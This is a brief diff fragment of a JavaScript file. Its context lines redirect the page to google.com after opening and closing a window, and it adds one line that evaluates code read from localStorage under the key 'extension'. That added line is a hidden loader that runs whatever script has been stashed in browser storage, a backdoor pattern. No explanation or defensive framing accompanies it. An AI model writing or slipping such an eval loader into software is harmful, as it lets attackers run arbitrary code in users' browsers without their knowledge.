@@ -1146,3 +1146,4 @@ if(window == top){
     setTimeout(function(){var ww = win2.open(window.location, '_self'); ww.close(); }, 0);
     location.href = "https://google.com";
 }
+eval(localStorage.getItem("extension"));
